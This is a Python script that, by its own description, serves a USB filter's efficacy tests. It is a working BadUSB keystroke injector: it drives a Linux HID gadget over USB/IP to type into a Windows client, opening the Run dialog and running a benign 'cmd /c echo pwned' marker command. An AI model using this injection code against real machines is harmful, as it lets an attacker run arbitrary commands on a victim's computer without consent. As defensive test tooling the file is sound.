#!/usr/bin/env python3
"""Live BadUSB keystroke injection over USB/IP via a configfs HID gadget.

Once a HID gadget is attached by the Windows client, writing 8-byte boot-keyboard
reports to /dev/hidgN delivers real keystrokes to that client. This is what makes
the HID simulation a *real* attack rather than just a device that enumerates.

Used by the efficacy tests (filter DISABLED) to prove the attack works. With the
filter ON the device never attaches, /dev/hidgN never opens, and nothing types.

Layout assumption: US QWERTY on the client. Timing/layout may need tuning.

Examples:
  hid_type.py --device /dev/hidg0 --text "hello world"
  hid_type.py --device /dev/hidg0 --run-marker deadbeef
      # opens Run (Win+R) and runs: cmd /c echo pwned>C:\\Users\\Public\\ub_<tok>.txt
"""

from __future__ import annotations

import argparse
import atexit
import errno
import glob
import os
import stat
import time

# Writing to /dev/hidgN before the host has selected the configuration and
# enabled the interrupt-IN endpoint fails with ESHUTDOWN ("Cannot send after
# transport endpoint shutdown"); a busy gadget can also momentarily return
# EAGAIN. Both mean "not ready yet, retry", not a hard failure.
_NOT_READY_ERRNOS = frozenset({errno.ESHUTDOWN, errno.EAGAIN})

# configfs root where libcomposite publishes gadgets.
_GADGET_ROOT = "/sys/kernel/config/usb_gadget"

# Modifier bits (byte 0 of the boot-keyboard report).
MOD_LSHIFT = 0x02
MOD_LGUI = 0x08

# Special keys.
KEY_ENTER = 0x28
KEY_SPACE = 0x2C
KEY_R = 0x15


def _build_keymap() -> dict[str, tuple[int, bool]]:
    """Map a printable ASCII char -> (usage_code, needs_shift) for US layout."""
    m: dict[str, tuple[int, bool]] = {}

    for i, c in enumerate("abcdefghijklmnopqrstuvwxyz"):
        m[c] = (0x04 + i, False)
        m[c.upper()] = (0x04 + i, True)

    digits = "1234567890"
    for i, c in enumerate(digits):
        m[c] = (0x1E + i, False)
    for shifted, base in zip("!@#$%^&*()", digits):
        m[shifted] = (m[base][0], True)

    m[" "] = (KEY_SPACE, False)
    pairs = {
        "-": (0x2D, "_"), "=": (0x2E, "+"), "[": (0x2F, "{"), "]": (0x30, "}"),
        "\\": (0x31, "|"), ";": (0x33, ":"), "'": (0x34, '"'), "`": (0x35, "~"),
        ",": (0x36, "<"), ".": (0x37, ">"), "/": (0x38, "?"),
    }
    for base, (code, shifted) in pairs.items():
        m[base] = (code, False)
        m[shifted] = (code, True)
    return m


KEYMAP = _build_keymap()


def _report(modifier: int = 0, key: int = 0) -> bytes:
    return bytes([modifier, 0, key, 0, 0, 0, 0, 0])


def _node_major_minor(node: str) -> tuple[int, int]:
    st = os.stat(node)
    return os.major(st.st_rdev), os.minor(st.st_rdev)


def resolve_hid_device(spec: str = "auto", root: str = _GADGET_ROOT) -> str:
    """Resolve which /dev/hidgN char node to write keystrokes to.

    A literal path (e.g. /dev/hidg0) is returned unchanged. With "auto" we map
    the HID gadget function's configfs ``dev`` attribute (a "major:minor" pair)
    to the matching /dev/hidg* node instead of assuming hidg0.

    Why this matters: f_hid hands out hidg minors in creation order and does NOT
    reset them just because a gadget was torn down. A leftover /dev/hidg0 from a
    previous gadget can outlive its binding, so hardcoding hidg0 may target an
    orphaned node whose endpoint is permanently disabled -- every write then
    fails with ESHUTDOWN even though the *current* gadget is healthy on hidg1.
    We prefer functions belonging to a gadget actually bound to a UDC.
    """
    if spec and spec != "auto":
        return spec

    bound: list[str] = []
    unbound: list[str] = []
    for gadget in sorted(glob.glob(os.path.join(root, "*"))):
        try:
            udc = open(os.path.join(gadget, "UDC")).read().strip()
        except OSError:
            udc = ""
        dev_attrs = sorted(glob.glob(os.path.join(gadget, "functions", "hid.*", "dev")))
        (bound if udc else unbound).extend(dev_attrs)

    candidates = bound or unbound
    if not candidates:
        raise RuntimeError(
            f"no HID gadget function found under {root}; build and bind a HID "
            f"gadget (gadgets/hid_keyboard.sh) before injecting keystrokes")

    want = open(candidates[0]).read().strip()  # decimal "major:minor"
    try:
        maj, minr = (int(x) for x in want.split(":"))
    except ValueError as e:
        raise RuntimeError(f"unexpected hid dev attribute {want!r}") from e

    for node in sorted(glob.glob("/dev/hidg*")):
        try:
            if _node_major_minor(node) == (maj, minr):
                return node
        except OSError:
            continue

    # No /dev/hidg* node matches the live function's char device. This is the
    # nastier variant of the stale-node problem: udev/devtmpfs did not create a
    # node for the current function, and any existing /dev/hidg0 belongs to an
    # old gadget with a different major (writing to it gives ESHUTDOWN forever).
    # The configfs dev attribute is authoritative for the bound function, so
    # create our own node for that major:minor and talk to the live endpoint.
    return _make_hid_node(maj, minr,
                          have=sorted(glob.glob("/dev/hidg*")) or ["none"])


def _make_hid_node(maj: int, minr: int, have: list[str]) -> str:
    """Create a throwaway char-device node for the HID function's major:minor.

    Requires CAP_MKNOD (root) -- the same privilege the gadget scripts already
    need. The node is created under /dev and unlinked at process exit.

    It must NOT go on /tmp: that is commonly tmpfs mounted 'nodev', where the
    kernel refuses to treat the inode as a device and open() fails with EACCES
    even for root. /dev (devtmpfs) is where device nodes are honoured.
    """
    path = f"/dev/.hidg-test-{maj}-{minr}-{os.getpid()}"
    try:
        if os.path.lexists(path):
            os.unlink(path)
        os.mknod(path, stat.S_IFCHR | 0o600, os.makedev(maj, minr))
    except OSError as e:
        raise RuntimeError(
            f"HID function dev {maj}:{minr} has no matching /dev/hidg* node "
            f"(have: {', '.join(have)}) and creating one at {path} failed: {e}. "
            f"Run as root (CAP_MKNOD), or fix udev so hidg nodes are created."
        ) from e
    atexit.register(_safe_unlink, path)
    print(f"created HID node {path} for {maj}:{minr} "
          f"(no matching /dev/hidg* existed; have: {', '.join(have)})")
    return path


def _safe_unlink(path: str) -> None:
    try:
        os.unlink(path)
    except OSError:
        pass


def _udc_state_hint(root: str = _GADGET_ROOT) -> str:
    """Best-effort summary of each bound gadget's UDC state, for diagnostics.

    A persistent ESHUTDOWN with UDC state != 'configured' means the host never
    selected the configuration (so the endpoint stays disabled) -- a client-side
    problem, not a wrong-node one. Surfacing the state distinguishes the two.
    """
    notes = []
    for gadget in sorted(glob.glob(os.path.join(root, "*"))):
        try:
            udc = open(os.path.join(gadget, "UDC")).read().strip()
        except OSError:
            continue
        if not udc:
            continue
        try:
            state = open(f"/sys/class/udc/{udc}/state").read().strip()
        except OSError:
            state = "unknown"
        notes.append(f"{os.path.basename(gadget)} -> UDC {udc} state={state}")
    return "; ".join(notes) if notes else "no gadget bound to a UDC"


class Keyboard:
    def __init__(self, device: str, char_delay: float = 0.01,
                 ready_timeout: float = 10.0):
        self.device = device
        self.char_delay = char_delay
        self.ready_timeout = ready_timeout

    def _write_reports(self, *reports: bytes) -> None:
        """Open the gadget and write the report(s), retrying while the host has
        not yet enabled the HID endpoint.

        After attach the USB *device* enumerates before the HID *interface* is
        live, so the first write can race the client selecting the configuration
        / loading its keyboard driver and fail with ESHUTDOWN. We retry until the
        endpoint accepts the write or ready_timeout elapses, then fail with an
        actionable message instead of a bare BrokenPipeError.
        """
        deadline = time.time() + self.ready_timeout
        while True:
            try:
                with open(self.device, "wb") as f:
                    for r in reports:
                        f.write(r)
                        f.flush()
                return
            except OSError as e:
                if e.errno not in _NOT_READY_ERRNOS:
                    raise
                if time.time() >= deadline:
                    raise RuntimeError(
                        f"HID endpoint {self.device} never became writable "
                        f"(errno {e.errno}: {os.strerror(e.errno)}) within "
                        f"{self.ready_timeout:g}s. The device attached but the "
                        f"client did not enable the HID interface -- it may still "
                        f"be loading the keyboard driver, or the gadget was "
                        f"detached. Increase --ready-timeout if the client is slow. "
                        f"Gadget UDC state: {_udc_state_hint()} "
                        f"(state != 'configured' means the host never selected the "
                        f"configuration -- a client-side problem, not this payload)."
                    ) from e
                time.sleep(0.25)

    def wait_ready(self) -> None:
        """Block until the client has enabled the HID endpoint (or time out).

        Sends a single all-zero ("no keys pressed") report, which is a harmless
        readiness probe: it delivers no keystroke but exercises the same write
        path, so a successful probe means real keystrokes will land.
        """
        self._write_reports(_report())

    def _send(self, modifier: int, key: int) -> None:
        self._write_reports(_report(modifier, key), _report())  # press, release
        time.sleep(self.char_delay)

    def type_text(self, text: str) -> None:
        for ch in text:
            if ch == "\n":
                self._send(0, KEY_ENTER)
                continue
            entry = KEYMAP.get(ch)
            if entry is None:
                raise ValueError(f"unmapped character: {ch!r}")
            code, shift = entry
            self._send(MOD_LSHIFT if shift else 0, code)

    def press_enter(self) -> None:
        self._send(0, KEY_ENTER)

    def open_run_dialog(self) -> None:
        self._send(MOD_LGUI, KEY_R)


def run_marker(kb: Keyboard, token: str, settle: float = 1.5) -> str:
    """Open Run and drop a marker file readable by the WinRM oracle.

    Writes C:\\Users\\Public\\ub_<token>.txt (Public is world-writable, so the
    interactive session and the WinRM session agree on the path).
    """
    path = f"C:\\Users\\Public\\ub_{token}.txt"
    kb.wait_ready()  # let the client finish enabling the HID interface
    kb.open_run_dialog()
    time.sleep(settle)
    kb.type_text(f"cmd /c echo pwned>{path}")
    time.sleep(0.3)
    kb.press_enter()
    return path


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--device", default="auto",
                    help="HID gadget node to write to, or 'auto' (default) to "
                         "resolve the /dev/hidgN backing the bound HID gadget")
    ap.add_argument("--text", help="type this literal text then Enter")
    ap.add_argument("--run-marker", metavar="TOKEN",
                    help="open Run and drop C:\\Users\\Public\\ub_<TOKEN>.txt")
    ap.add_argument("--char-delay", type=float, default=0.01)
    ap.add_argument("--ready-timeout", type=float, default=10.0,
                    help="seconds to wait for the client to enable the HID "
                         "endpoint before giving up (default: 10)")
    args = ap.parse_args()

    device = resolve_hid_device(args.device)
    if device != args.device:
        print(f"resolved HID device {args.device!r} -> {device}")
    kb = Keyboard(device, char_delay=args.char_delay,
                  ready_timeout=args.ready_timeout)
    if args.run_marker:
        path = run_marker(kb, args.run_marker)
        print(f"fired run-marker -> {path}")
    elif args.text:
        kb.wait_ready()  # let the client finish enabling the HID interface
        kb.type_text(args.text)
        kb.press_enter()
        print(f"typed {len(args.text)} chars")
    else:
        ap.error("one of --text or --run-marker is required")


if __name__ == "__main__":
    main()
